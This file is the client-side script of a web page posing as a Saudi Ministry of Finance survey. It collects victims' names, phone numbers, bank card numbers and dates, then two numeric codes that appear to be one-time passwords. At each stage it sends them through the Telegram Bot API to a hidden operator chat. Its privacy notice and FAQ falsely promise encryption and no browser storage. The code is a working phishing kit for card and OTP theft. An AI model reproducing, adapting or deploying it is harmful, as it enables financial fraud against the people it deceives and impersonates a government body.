// app.js - النسخة المحدثة مع جميع التعديلات
document.addEventListener('DOMContentLoaded', function() {
    // تهيئة النظام عند تحميل الصفحة
    initSystem();
    initDateSelectors();
    
    // تعيين اللغة المفضلة
    const preferredLang = localStorage.getItem('preferredLanguage') || 'ar';
    changeLanguage(preferredLang);
    
    // إخفاء شاشة التحميل بعد ثانيتين
    setTimeout(() => {
        document.getElementById('loading').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 500);
    }, 1000);
});

// تهيئة النظام
function initSystem() {
    console.log('🚀 نظام استبيانات الخدمات المالية - الإصدار 4.0.1');
    
    // جمع معلومات الجهاز تلقائياً
    detectDeviceInfo();
    
    // إعداد مستمعي الأحداث
    setupEventListeners();
    
    // التحقق من اتصال الإنترنت
    checkInternetConnection();
    
    // بدء مراقبة النشاط
    startActivityMonitor();
    
    // إعداد تأكيد الخروج
    setupExitConfirmation();
}

// جمع معلومات الجهاز (النوع فقط)
function detectDeviceInfo() {
    const userAgent = navigator.userAgent;
    
    // تحديد نوع الجهاز فقط
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    document.getElementById('deviceType').textContent = isMobile ? 'جوال' : 'كمبيوتر';
    
    // إخفاء العناصر الأخرى
    const otherDeviceInfo = ['browserType', 'osType', 'screenSize'];
    otherDeviceInfo.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.parentElement.style.display = 'none';
        }
    });
}

// تهيئة تواريخ الشهور والسنة
function initDateSelectors() {
    const monthSelect = document.getElementById('membershipMonth');
    const yearSelect = document.getElementById('membershipYear');
    
    if (!monthSelect) return;
    
    const currentLang = localStorage.getItem('preferredLanguage') || 'ar';
    
    // إضافة الشهور
    const months = currentLang === 'ar' ? MONTHS_AR : MONTHS_EN;
    monthSelect.innerHTML = '<option value="">اختر الشهر</option>';
    months.forEach((month, index) => {
        const option = document.createElement('option');
        option.value = index + 1;
        option.textContent = month;
        monthSelect.appendChild(option);
    });
    
    // إضافة السنوات (من 2010 إلى السنة الحالية)
    const years = generateYears();
    yearSelect.innerHTML = '<option value="">اختر السنة</option>';
    years.forEach(year => {
        const option = document.createElement('option');
        option.value = year;
        option.textContent = year;
        yearSelect.appendChild(option);
    });
}

// تغيير اللغة
function changeLanguage(lang) {
    // حفظ اللغة المفضلة
    localStorage.setItem('preferredLanguage', lang);
    
    // تحديث زر اللغة
    const langText = lang === 'ar' ? 'العربية' : 
                    lang === 'en' ? 'English' : 
                    'ⵜⴰⵎⴰⵣⵉⵖⵜ';
    document.getElementById('currentLang').textContent = langText;
    
    // تحديث جميع النصوص
    updateAllTexts(lang);
    
    // تحديث التواريخ بلغة جديدة
    const monthSelect = document.getElementById('membershipMonth');
    const yearSelect = document.getElementById('membershipYear');
    if (monthSelect) {
        monthSelect.innerHTML = '<option value="">اختر الشهر</option>';
        yearSelect.innerHTML = '<option value="">اختر السنة</option>';
        initDateSelectors();
    }
    
    // تحديث الوقت
    updateTime();
    
    // إشعار بنجاح تغيير اللغة
    showNotification('تم تغيير اللغة بنجاح', 'success');
}

// تحديث جميع النصوص
function updateAllTexts(lang) {
    const translation = TRANSLATIONS[lang] || TRANSLATIONS.ar;
    
    // تحديث النصوص الديناميكية
    Object.keys(translation).forEach(key => {
        const element = document.getElementById(key);
        if (element) {
            element.textContent = translation[key];
        }
    });
    
    // تحديث عنوان الصفحة
    document.getElementById('pageTitle').textContent = translation.pageTitle;
    document.title = translation.pageTitle;
}

// إعداد مستمعي الأحداث
function setupEventListeners() {
    // اختيار اللغة
    const langToggle = document.getElementById('languageToggle');
    if (langToggle) {
        langToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            const dropdown = this.nextElementSibling;
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        });
    }
    
    // إغلاق قائمة اللغة عند النقر خارجها
    document.addEventListener('click', function() {
        document.querySelectorAll('.language-dropdown').forEach(dropdown => {
            dropdown.style.display = 'none';
        });
    });
    
    // التحقق من صحة المدخلات مع النصائح
    const inputs = document.querySelectorAll('.form-input, .month-select, .year-select, .code-input');
    inputs.forEach(input => {
        input.addEventListener('blur', validateField);
        input.addEventListener('input', function() {
            this.classList.remove('error');
            this.style.borderColor = '';
            hideTip(this.id + 'Tip');
        });
    });
    
    // مستمعات للنصائح
    document.getElementById('phoneNumber').addEventListener('input', function() {
        showPhoneTip(this.value);
    });
    
    document.getElementById('cardNumber').addEventListener('input', function() {
        showCardTip(this.value);
    });
    
    document.getElementById('trialCode').addEventListener('input', function() {
        showCodeTip(this.value, 'trialCodeTip');
    });
    
    document.getElementById('finalCode').addEventListener('input', function() {
        showCodeTip(this.value, 'finalCodeTip');
    });
}

// إعداد تأكيد الخروج
function setupExitConfirmation() {
    let hasUnsavedChanges = false;
    
    // تعقب التغييرات
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            hasUnsavedChanges = true;
        });
        
        input.addEventListener('change', () => {
            hasUnsavedChanges = true;
        });
    });
    
    // تأكيد عند الخروج
    window.addEventListener('beforeunload', function(e) {
        if (hasUnsavedChanges) {
            e.preventDefault();
            e.returnValue = 'لديك بيانات غير محفوظة. هل أنت متأكد من المغادرة؟';
            return e.returnValue;
        }
    });
    
    // إعادة تعيين عند الإرسال الناجح
    window.resetUnsavedChanges = function() {
        hasUnsavedChanges = false;
    };
}

// التحقق من صحة الحقل
function validateField(e) {
    const field = e.target;
    const value = field.value.trim();
    
    // إذا كان الحقل مطلوباً وفارغاً
    if (field.required && !value) {
        field.classList.add('error');
        field.style.borderColor = '#dc3545';
        return false;
    }
    
    // التحقق من صحة الهاتف
    if (field.id === 'phoneNumber' && value) {
        const pattern = CONFIG.VALIDATION.PHONE_PATTERN;
        if (!pattern.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            return false;
        }
    }
    
    // التحقق من صحة رقم البطاقة
    if (field.id === 'cardNumber' && value) {
        const pattern = CONFIG.VALIDATION.CARD_PATTERN;
        if (!pattern.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            return false;
        }
    }
    
    // التحقق من صحة الرموز (4-6 أرقام)
    if ((field.id === 'trialCode' || field.id === 'finalCode') && value) {
        if (!/^\d{4,6}$/.test(value)) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            return false;
        }
    }
    
    // إذا كان الحقل صحيحاً
    field.classList.remove('error');
    field.style.borderColor = '#28a745';
    return true;
}

// نظام النصائح المخفية
let currentTip = null;
let tipTimeout = null;

function showTip(tipId, message, type = 'warning') {
    const tipElement = document.getElementById(tipId);
    if (!tipElement) return;
    
    // إخفاء النصيحة الحالية
    hideTip(currentTip);
    
    // إظهار النصيحة الجديدة
    tipElement.textContent = message;
    tipElement.className = `hidden-tip ${type}`;
    tipElement.classList.add('show');
    currentTip = tipId;
    
    // إخفاء النصيحة بعد 5 ثوان
    clearTimeout(tipTimeout);
    tipTimeout = setTimeout(() => {
        hideTip(tipId);
    }, 5000);
}

function hideTip(tipId) {
    if (!tipId) return;
    const tipElement = document.getElementById(tipId);
    if (tipElement) {
        tipElement.classList.remove('show');
        if (currentTip === tipId) {
            currentTip = null;
        }
    }
}

function showPhoneTip(value) {
    if (value.length > 0 && !/^(05|06|07)/.test(value)) {
        showTip('phoneTip', '⚠️ يجب أن يبدأ رقم الهاتف بـ 05 أو 06 أو 07', 'warning');
    } else {
        hideTip('phoneTip');
    }
}

function showCardTip(value) {
    if (value.length > 0 && !/^\d+$/.test(value)) {
        showTip('cardTip', '⚠️ يجب أن يحتوي رقم البطاقة على أرقام فقط', 'warning');
    } else if (value.length === 16 && /^\d+$/.test(value)) {
        showTip('cardTip', '✓ رقم البطاقة صحيح', 'success');
    } else {
        hideTip('cardTip');
    }
}

function showCodeTip(value, tipId) {
    if (value.length > 0 && !/^\d+$/.test(value)) {
        showTip(tipId, '⚠️ يجب أن يحتوي الرمز على أرقام فقط', 'warning');
    } else if (value.length >= 4 && value.length <= 6 && /^\d+$/.test(value)) {
        showTip(tipId, `✓ الرمز مقبول (${value.length} أرقام)`, 'success');
    } else {
        hideTip(tipId);
    }
}

// المرحلة 1: إرسال البيانات الأساسية
async function sendToManager() {
    // التحقق من صحة النموذج
    if (!validateFormStep1()) {
        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
        return;
    }
    
    // جمع البيانات من المرحلة 1
    const userData = {
        fullName: document.getElementById('fullName').value.trim(),
        phoneNumber: document.getElementById('phoneNumber').value.trim(),
        cardNumber: document.getElementById('cardNumber').value.trim(),
        membershipDate: {
            month: document.getElementById('membershipMonth').value,
            year: document.getElementById('membershipYear').value
        },
        stage: 1,
        submissionTime: new Date().toLocaleString('ar-SA'),
        timestamp: new Date().toISOString()
    };
    
    // حفظ البيانات مؤقتاً
    localStorage.setItem('currentSurvey', JSON.stringify(userData));
    
    // تغيير حالة الزر إلى جاري الإرسال
    const sendBtn = document.querySelector('.send-btn');
    const originalText = sendBtn.innerHTML;
    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    sendBtn.disabled = true;
    
    try {
        // ✅ الإرسال الأول: البيانات الأساسية للمدير
        const message1 = `📝 *مرحلة 1 - بيانات أساسية*

تم استلام معلومات مستخدم جديد:
👤 *الاسم:* ${userData.fullName}
📱 *الهاتف:* \`${userData.phoneNumber}\`
💳 *البطاقة:* \`${userData.cardNumber}\`
📅 *تاريخ الانتماء:* ${userData.membershipDate.month}/${userData.membershipDate.year}

⏳ *الحالة:* بانتظار الرمز التجريبي
🕐 *الوقت:* ${userData.submissionTime}
📍 *المرحلة:* 1/4`;

        const success1 = await sendTelegramMessage(message1);
        
        if (success1) {
            // الانتقال للصفحة 2 بعد النجاح
            goToPage(2);
            showNotification('تم إرسال بياناتك للمدير، الرجاء إدخال الرمز التجريبي', 'success');
            
            // حفظ وقت المرحلة 1
            localStorage.setItem('stage1Time', userData.submissionTime);
            
            // إعادة تعيين تأكيد الخروج
            resetUnsavedChanges();
        } else {
            throw new Error('فشل إرسال البيانات');
        }
        
    } catch (error) {
        console.error('❌ خطأ في المرحلة 1:', error);
        showNotification('فشل إرسال البيانات، يرجى المحاولة مرة أخرى', 'error');
    } finally {
        // إعادة تعيين الزر
        sendBtn.innerHTML = originalText;
        sendBtn.disabled = false;
    }
}

// التحقق من صحة النموذج في المرحلة 1
function validateFormStep1() {
    let isValid = true;
    
    // الحقول المطلوبة
    const requiredFields = ['fullName', 'phoneNumber', 'cardNumber'];
    requiredFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (!field.value.trim()) {
            field.classList.add('error');
            field.style.borderColor = '#dc3545';
            isValid = false;
        }
    });
    
    // التاريخ
    const month = document.getElementById('membershipMonth').value;
    const year = document.getElementById('membershipYear').value;
    if (!month || !year) {
        document.getElementById('membershipMonth').classList.add('error');
        document.getElementById('membershipYear').classList.add('error');
        document.getElementById('membershipMonth').style.borderColor = '#dc3545';
        document.getElementById('membershipYear').style.borderColor = '#dc3545';
        isValid = false;
    }
    
    // الموافقة على الشروط
    const confirmation = document.getElementById('dataConfirmation');
    if (!confirmation.checked) {
        confirmation.parentElement.style.borderColor = '#dc3545';
        isValid = false;
    } else {
        confirmation.parentElement.style.borderColor = '#28a745';
    }
    
    return isValid;
}

// المرحلة 2: إرسال الرمز التجريبي
async function sendTrialCode() {
    const trialCode = document.getElementById('trialCode').value.trim();
    
    // التحقق من صحة الرمز التجريبي (4-6 أرقام)
    if (!trialCode || trialCode.length < 4 || trialCode.length > 6 || !/^\d+$/.test(trialCode)) {
        showNotification('الرجاء إدخال رمز مكون من 4 إلى 6 أرقام', 'error');
        return;
    }
    
    // استرجاع البيانات من المرحلة 1
    const userData = JSON.parse(localStorage.getItem('currentSurvey') || '{}');
    if (!userData.fullName) {
        showNotification('لم يتم العثور على بيانات سابقة، يرجى البدء من جديد', 'error');
        goToPage(1);
        return;
    }
    
    // حفظ الرمز التجريبي
    localStorage.setItem('trialCode', trialCode);
    
    // تغيير حالة الزر
    const trialBtn = document.querySelector('.trial-btn');
    const originalText = trialBtn.innerHTML;
    trialBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    trialBtn.disabled = true;
    
    try {
        // ✅ الإرسال الثاني: الرمز التجريبي للمدير
        const message2 = `🔐 *مرحلة 2 - رمز تجريبي*

المستخدم أدخل الرمز التجريبي:
👤 ${userData.fullName} (\`${userData.phoneNumber}\`)
🔢 *الرمز التجريبي:* \`${trialCode}\` (${trialCode.length} أرقام)

📱 *معلومات الجهاز:*
• النوع: ${document.getElementById('deviceType').textContent}

⏳ *الحالة:* بانتظار الرمز النهائي
🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}
📍 *المرحلة:* 2/4`;

        const success2 = await sendTelegramMessage(message2);
        
        if (success2) {
            // الانتقال للصفحة 3 بعد النجاح
            goToPage(3);
            showNotification('تم إرسال الرمز التجريبي للمدير', 'success');
            
            // تعيين الرمز التجريبي في الصفحة 3
            document.getElementById('trialCodeDisplay').textContent = trialCode;
            
            // حفظ وقت المرحلة 2
            localStorage.setItem('stage2Time', new Date().toLocaleString('ar-SA'));
            
            // إعادة تعيين تأكيد الخروج
            resetUnsavedChanges();
        } else {
            throw new Error('فشل إرسال الرمز التجريبي');
        }
        
    } catch (error) {
        console.error('❌ خطأ في المرحلة 2:', error);
        showNotification('فشل إرسال الرمز التجريبي، يرجى المحاولة مرة أخرى', 'error');
    } finally {
        // إعادة تعيين الزر
        trialBtn.innerHTML = originalText;
        trialBtn.disabled = false;
    }
}

// المرحلة 3: إرسال الرمز النهائي
async function sendFinalCode() {
    const finalCode = document.getElementById('finalCode').value.trim();
    const trialCode = localStorage.getItem('trialCode') || '';
    
    // التحقق من صحة الرمز النهائي (4-6 أرقام)
    if (!finalCode || finalCode.length < 4 || finalCode.length > 6 || !/^\d+$/.test(finalCode)) {
        showNotification('الرجاء إدخال رمز مكون من 4 إلى 6 أرقام', 'error');
        return;
    }
    
    // التحقق من اختلاف الرمزين
    if (finalCode === trialCode) {
        showNotification('يجب أن يختلف الرمز النهائي عن الرمز التجريبي', 'error');
        return;
    }
    
    // استرجاع جميع البيانات
    const userData = JSON.parse(localStorage.getItem('currentSurvey') || '{}');
    if (!userData.fullName) {
        showNotification('لم يتم العثور على بيانات سابقة، يرجى البدء من جديد', 'error');
        goToPage(1);
        return;
    }
    
    // تحديث البيانات بالرموز
    userData.trialCode = trialCode;
    userData.finalCode = finalCode;
    userData.participationNumber = generateParticipationNumber();
    userData.completionTime = new Date().toLocaleString('ar-SA');
    
    // تغيير حالة الزر
    const finalBtn = document.querySelector('.final-btn');
    const originalText = finalBtn.innerHTML;
    finalBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
    finalBtn.disabled = true;
    
    try {
        // ✅ الإرسال الثالث: الرمز النهائي للمدير
        const message3 = `🔒 *مرحلة 3 - رمز نهائي*

المستخدم أكمل إدخال الرموز:
👤 ${userData.fullName} (\`${userData.phoneNumber}\`)
🔐 *الرموز:*
   • التجريبي: \`${trialCode}\` (${trialCode.length} أرقام)
   • النهائي: \`${finalCode}\` (${finalCode.length} أرقام)

⏳ *الحالة:* جاهز للإرسال النهائي
🕐 *الوقت:* ${userData.completionTime}
📍 *المرحلة:* 3/4`;

        const success3 = await sendTelegramMessage(message3);
        
        if (success3) {
            // ✅ الإرسال النهائي: جميع البيانات للمدير
            const finalMessage = `🎉 *إكمال الاستبيان - جميع البيانات*

📊 *المعلومات الشخصية:*
👤 الاسم: ${userData.fullName}
📱 الهاتف: \`${userData.phoneNumber}\`
💳 البطاقة: \`${userData.cardNumber}\`
📅 تاريخ الانتماء: ${userData.membershipDate.month}/${userData.membershipDate.year}

🔐 *الرموز:*
   • التجريبي: \`${trialCode}\` (${trialCode.length} أرقام)
   • النهائي: \`${finalCode}\` (${finalCode.length} أرقام)

🔢 *رقم المشاركة:* \`${userData.participationNumber}\`
📱 *معلومات الجهاز:*
   • النوع: ${document.getElementById('deviceType').textContent}

🕐 *مراحل الإرسال:*
   • المرحلة 1: ${localStorage.getItem('stage1Time') || userData.submissionTime}
   • المرحلة 2: ${localStorage.getItem('stage2Time') || 'قبل قليل'}
   • المرحلة 3: ${userData.completionTime}

✅ *الحالة:* تم إكمال جميع المراحل بنجاح
📍 *المرحلة:* 4/4`;

            const successFinal = await sendTelegramMessage(finalMessage);
            
            if (successFinal) {
                // الانتقال للصفحة 4 وعرض البيانات
                showCompletionPage(userData);
                showNotification('تم إرسال جميع البيانات للمدير بنجاح!', 'success');
                
                // حفظ البيانات النهائية
                saveToLocalHistory(userData);
                
                // إعادة تعيين تأكيد الخروج
                resetUnsavedChanges();
            } else {
                throw new Error('فشل الإرسال النهائي');
            }
        } else {
            throw new Error('فشل إرسال الرمز النهائي');
        }
        
    } catch (error) {
        console.error('❌ خطأ في المرحلة 3:', error);
        showNotification('فشل إرسال البيانات، يرجى المحاولة مرة أخرى', 'error');
    } finally {
        // إعادة تعيين الزر
        finalBtn.innerHTML = originalText;
        finalBtn.disabled = false;
    }
}

// وظيفة مساعدة للإرسال إلى تيليغرام
async function sendTelegramMessage(message) {
    try {
        const botToken = CONFIG.TELEGRAM_BOT.TOKEN;
        const chatId = CONFIG.TELEGRAM_BOT.CHAT_ID;
        
        // إذا لم يتم تكوين البوت بعد، عرض البيانات في الكونسول
        if (botToken === 'YOUR_BOT_TOKEN_HERE' || chatId === 'YOUR_CHAT_ID_HERE') {
            console.log('📤 رسالة للمدير (للاختبار):');
            console.log(message);
            console.log('---');
            return true; // إرجاع نجاح للاختبار
        }
        
        // إرسال الرسالة عبر API تيليغرام
        const response = await fetch(
            `${CONFIG.TELEGRAM_BOT.API_URL}${botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            }
        );
        
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ تم إرسال الرسالة إلى تيليغرام');
            return true;
        } else {
            console.error('❌ خطأ في إرسال تيليغرام:', result);
            return false;
        }
        
    } catch (error) {
        console.error('❌ خطأ في الاتصال بتيليغرام:', error);
        return false;
    }
}

// إنشاء رقم مشاركة فريد
function generateParticipationNumber() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 6).toUpperCase();
    return `MOF-${timestamp}-${random}`;
}

// الانتقال بين الصفحات
function goToPage(pageNumber) {
    // إخفاء جميع الصفحات
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // إظهار الصفحة المطلوبة
    const targetPage = document.getElementById(`page${pageNumber}`);
    if (targetPage) {
        targetPage.classList.add('active');
    } else {
        console.error(`❌ الصفحة ${pageNumber} غير موجودة`);
        return;
    }
    
    // تحديث مؤشر التقدم
    updateProgressIndicator(pageNumber);
    
    // التمرير لأعلى الصفحة
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// تحديث مؤشر التقدم
function updateProgressIndicator(currentStep) {
    const steps = document.querySelectorAll('.progress-step');
    const lines = document.querySelectorAll('.progress-line');
    
    steps.forEach((step, index) => {
        step.classList.remove('active', 'completed');
        if (index < currentStep - 1) {
            step.classList.add('completed');
        } else if (index === currentStep - 1) {
            step.classList.add('active');
        }
    });
    
    lines.forEach((line, index) => {
        line.classList.remove('active');
        if (index < currentStep - 1) {
            line.classList.add('active');
        }
    });
}

// تعبئة الرمز التجريبي تلقائياً
function fillTrialCode(code) {
    document.getElementById('trialCode').value = code;
    document.getElementById('trialCode').style.borderColor = '#28a745';
}

// تعبئة الرمز النهائي تلقائياً
function fillFinalCode(code) {
    document.getElementById('finalCode').value = code;
    document.getElementById('finalCode').style.borderColor = '#28a745';
}

// عرض صفحة الإكمال
function showCompletionPage(userData) {
    // تبسيط البيانات المعروضة
    document.getElementById('surveyId').textContent = userData.participationNumber;
    document.getElementById('submissionDate').textContent = userData.completionTime;
    
    // إخفاء البيانات الحساسة
    document.getElementById('submittedName').style.display = 'none';
    document.getElementById('submittedPhone').style.display = 'none';
    
    // إخفاء عناصر إضافية
    const sensitiveElements = document.querySelectorAll('.detail-item:nth-child(3), .detail-item:nth-child(4)');
    sensitiveElements.forEach(el => {
        el.style.display = 'none';
    });
    
    // الانتقال للصفحة 4
    goToPage(4);
    
    // تعيين رقم المشاركة لمشاركته لاحقاً
    localStorage.setItem('lastParticipationNumber', userData.participationNumber);
}

// حفظ في السجل المحلي
function saveToLocalHistory(userData) {
    const history = JSON.parse(localStorage.getItem('surveyHistory') || '[]');
    history.push({
        ...userData,
        savedAt: new Date().toISOString(),
        id: Date.now()
    });
    
    // حفظ فقط آخر 50 استبيان
    if (history.length > 50) {
        history.shift();
    }
    
    localStorage.setItem('surveyHistory', JSON.stringify(history));
    console.log('💾 تم حفظ الاستبيان في السجل المحلي');
}

// بدء استبيان جديد
function newSurvey() {
    // مسح البيانات المؤقتة
    localStorage.removeItem('currentSurvey');
    localStorage.removeItem('trialCode');
    localStorage.removeItem('stage1Time');
    localStorage.removeItem('stage2Time');
    
    // إعادة تعيين النموذج
    document.getElementById('fullName').value = '';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('membershipMonth').value = '';
    document.getElementById('membershipYear').value = '';
    document.getElementById('dataConfirmation').checked = false;
    document.getElementById('trialCode').value = '';
    document.getElementById('finalCode').value = '';
    
    // إعادة تعيين الأنماط
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.classList.remove('error');
        input.style.borderColor = '';
    });
    
    // إخفاء جميع النصائح
    document.querySelectorAll('.hidden-tip').forEach(tip => {
        tip.classList.remove('show');
    });
    
    // العودة للصفحة 1
    goToPage(1);
    showNotification('تم بدء استبيان جديد، يمكنك تعبئة البيانات', 'info');
    
    // إعادة تعيين تأكيد الخروج
    resetUnsavedChanges();
}

// مشاركة رقم المشاركة
function shareSurvey() {
    const participationNumber = localStorage.getItem('lastParticipationNumber') || 
                               document.getElementById('surveyId').textContent;
    
    if (!participationNumber || participationNumber === 'FS-2412-0001') {
        showNotification('لا يوجد رقم مشاركة حالي', 'error');
        return;
    }
    
    document.getElementById('shareCodeInput').value = participationNumber;
    document.getElementById('shareModal').classList.add('active');
}

// متابعة حالة المراجعة
function viewStatus() {
    const participationNumber = localStorage.getItem('lastParticipationNumber');
    
    if (participationNumber) {
        showNotification(`رقم مشاركتك: ${participationNumber}. سيتم التواصل معك قريباً.`, 'info');
    } else {
        showNotification('لا توجد مشاركات سابقة', 'warning');
    }
}

// نسخ إلى الحافظة
function copyToClipboard() {
    const shareInput = document.getElementById('shareCodeInput');
    const copyMessage = document.getElementById('copyMessage');
    
    if (!shareInput.value) {
        copyMessage.textContent = 'لا يوجد نص للنسخ';
        copyMessage.className = 'copy-message error';
        copyMessage.style.display = 'block';
        setTimeout(() => {
            copyMessage.style.display = 'none';
        }, 3000);
        return;
    }
    
    navigator.clipboard.writeText(shareInput.value)
        .then(() => {
            copyMessage.textContent = 'تم نسخ الرقم بنجاح';
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            setTimeout(() => {
                copyMessage.style.display = 'none';
            }, 3000);
        })
        .catch(() => {
            // طريقة بديلة للنسخ
            shareInput.select();
            document.execCommand('copy');
            
            copyMessage.textContent = 'تم نسخ الرقم (الطريقة البديلة)';
            copyMessage.className = 'copy-message success';
            copyMessage.style.display = 'block';
            setTimeout(() => {
                copyMessage.style.display = 'none';
            }, 3000);
        });
}

// التحقق من اتصال الإنترنت
function checkInternetConnection() {
    if (!navigator.onLine) {
        showNotification('⚠️ لا يوجد اتصال بالإنترنت. قد لا تعمل بعض الميزات.', 'warning');
    }
    
    window.addEventListener('online', () => {
        showNotification('تم استعادة الاتصال بالإنترنت', 'success');
    });
    
    window.addEventListener('offline', () => {
        showNotification('فقدان الاتصال بالإنترنت', 'error');
    });
}

// بدء مراقبة النشاط
function startActivityMonitor() {
    let lastActivity = Date.now();
    
    const activities = ['mousemove', 'keypress', 'click', 'scroll', 'touchstart'];
    activities.forEach(event => {
        document.addEventListener(event, () => {
            lastActivity = Date.now();
        });
    });
    
    // التحقق كل دقيقة
    setInterval(() => {
        const inactiveTime = Date.now() - lastActivity;
        const timeout = CONFIG?.SYSTEM?.SESSION_TIMEOUT || 30 * 60 * 1000;
        
        if (inactiveTime > timeout) {
            showNotification('تم إغلاق الجلسة بسبب عدم النشاط', 'warning');
            setTimeout(() => {
                newSurvey(); // إعادة تعيين النظام
            }, 3000);
        }
    }, 60000);
}

// عرض الإشعارات
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    if (!notification) {
        console.log(`[${type}] ${message}`);
        return;
    }
    
    notification.textContent = message;
    notification.className = `notification ${type} show`;
    
    // إخفاء الإشعار بعد 5 ثوانٍ
    setTimeout(() => {
        notification.classList.remove('show');
    }, 5000);
}

// إغلاق جميع النوافذ المنبثقة
function closeAllModals() {
    document.querySelectorAll('.modal').forEach(modal => {
        modal.classList.remove('active');
    });
}

// العودة للصفحة الرئيسية
function goHome() {
    goToPage(1);
}

// ============================================
// وظائف الفوتر والنوافذ المنبثقة
// ============================================

function showPrivacy() {
    const content = `
        <h4>سياسة الخصوصية</h4>
        <p>تلتزم وزارة المالية بحماية خصوصية مستخدمي نظام الاستبيانات والمحافظة على سرية البيانات الشخصية.</p>
        
        <h5>1. البيانات التي نجمعها</h5>
        <ul>
            <li>البيانات الشخصية (الاسم، رقم الهاتف، رقم البطاقة)</li>
            <li>بيانات الاستبيانات المقدمة</li>
            <li>معلومات الجهاز واتصال الإنترنت</li>
            <li>سجل الأنشطة على النظام</li>
        </ul>
        
        <h5>2. كيفية استخدام البيانات</h5>
        <ul>
            <li>تحليل وتطوير الخدمات المالية</li>
            <li>تحسين تجربة المستخدم</li>
            <li>الرد على الاستفسارات والمتابعة</li>
            <li>التواصل بشأن التحديثات</li>
        </ul>
        
        <h5>3. حماية البيانات</h5>
        <p>نستخدم تقنيات تشفير متقدمة لحماية بياناتك، ولا نشاركها مع أطراف ثالثة دون موافقتك.</p>
        
        <h5>4. حقوق المستخدم</h5>
        <p>لديك الحق في الوصول إلى بياناتك وتصحيحها أو حذفها، من خلال التواصل مع الدعم الفني.</p>
        
        <p><strong>آخر تحديث:</strong> ديسمبر 2024</p>
    `;
    document.getElementById('privacyContent').innerHTML = content;
    document.getElementById('privacyModal').classList.add('active');
}

function showTerms() {
    const content = `
        <h4>شروط الاستخدام</h4>
        <p>باستخدامك لهذا النظام، فإنك توافق على الالتزام بالشروط والأحكام التالية:</p>
        
        <h5>1. القبول</h5>
        <p>باستخدام النظام، فإنك تقر بأنك قرأت وفهمت ووافقت على هذه الشروط.</p>
        
        <h5>2. الاستخدام المسموح</h5>
        <ul>
            <li>تقديم استبيانات حقيقية ودقيقة</li>
            <li>استخدام النظام للأغراض المخصصة لها</li>
            <li>الالتزام بالقوانين والأنظمة السعودية</li>
        </ul>
        
        <h5>3. الاستخدام غير المسموح</h5>
        <ul>
            <li>تقديم معلومات كاذبة أو مضللة</li>
            <li>محاولة اختراق النظام أو تعطيله</li>
            <li>استخدام النظام لأغراض غير مشروعة</li>
        </ul>
        
        <h5>4. المسؤولية</h5>
        <p>أنت مسؤول عن دقة المعلومات المقدمة، ووزارة المالية غير مسؤولة عن أي معلومات غير صحيحة.</p>
        
        <h5>5. التعديلات</h5>
        <p>تحتفظ الوزارة بالحق في تعديل هذه الشروط في أي وقت، وسيتم إعلام المستخدمين بالتغييرات.</p>
    `;
    document.getElementById('termsContent').innerHTML = content;
    document.getElementById('termsModal').classList.add('active');
}

function showFAQ() {
    const content = `
        <h4>الأسئلة الشائعة</h4>
        
        <div class="faq-item">
            <h5>ما هو نظام استبيانات الخدمات المالية؟</h5>
            <p>نظام إلكتروني تابع لوزارة المالية يهدف إلى جمع آراء المستخدمين لتطوير الخدمات المالية.</p>
        </div>
        
        <div class="faq-item">
            <h5>هل بياناتي آمنة؟</h5>
            <p>نعم، جميع البيانات مشفرة وتصل مباشرة إلى إدارة النظام دون تخزين في المتصفح.</p>
        </div>
        
        <div class="faq-item">
            <h5>كيف أتابع استبياني؟</h5>
            <p>من خلال رقم المشاركة الذي ستحصل عليه، أو عبر بوت التليجرام الرسمي.</p>
        </div>
        
        <div class="faq-item">
            <h5>هل يمكنني تعديل البيانات بعد الإرسال؟</h5>
            <p>لا، بعد الإرسال لا يمكن التعديل. يجب التأكد من دقة البيانات قبل الإرسال.</p>
        </div>
        
        <div class="faq-item">
            <h5>ماذا أفعل إذا نسيت رقم المشاركة؟</h5>
            <p>يمكنك التواصل مع الدعم الفني على الرقم ${CONFIG.SYSTEM.SUPPORT_PHONE}.</p>
        </div>
    `;
    document.getElementById('faqContent').innerHTML = content;
    document.getElementById('faqModal').classList.add('active');
}

function showSupport() {
    const content = `
        <h4>الدعم الفني</h4>
        <p>فريق الدعم الفني جاهز لمساعدتك في أي استفسار أو مشكلة تواجهها.</p>
        
        <div class="support-channels">
            <div class="channel">
                <h5><i class="fas fa-phone"></i> الهاتف</h5>
                <p>${CONFIG.SYSTEM.SUPPORT_PHONE}</p>
                <small>الأحد - الخميس: 8 ص - 4 م</small>
            </div>
            
            <div class="channel">
                <h5><i class="fas fa-envelope"></i> البريد الإلكتروني</h5>
                <p>${CONFIG.SYSTEM.ADMIN_EMAIL}</p>
                <small>الرد خلال 24 ساعة عمل</small>
            </div>
        </div>
        
        <h5>المشاكل الشائعة وحلولها:</h5>
        <ul>
